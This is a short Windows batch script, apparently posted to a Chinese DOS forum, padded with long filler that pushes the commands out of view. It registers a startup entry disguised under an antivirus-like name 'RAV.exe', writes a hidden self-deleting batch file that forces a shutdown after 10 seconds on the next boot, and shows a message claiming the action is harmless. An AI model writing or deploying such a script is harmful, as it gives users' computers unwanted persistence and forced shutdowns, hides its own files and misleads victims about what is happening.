author:pengfei@www.cn-dos.net
%%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a 
cls
@reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v RAV.exe /t reg_sz /d d:\rav.bat /f
echo 你好！你的电脑将在10秒内关闭，此情况在下一次启动时恢复正常 >>d:\Rav.txt
echo 不会对您的计算机带来任何伤害，请放心使用 >>d:\Rav.txt
echo start RAV.txt >>d:\Rav.bat
echo @reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v RAV.exe /f >>d:\Rav.bat
echo del d:\Rav.txt /f >>d:\Rav.bat
echo shutdown -s -t 10 >>d:\Rav.bat
echo del d:\Rav.bat /f /a s r h >>d:\Rav.bat
attrib +s +r +h d:\Rav.bat
ECHO 处于关闭状态。
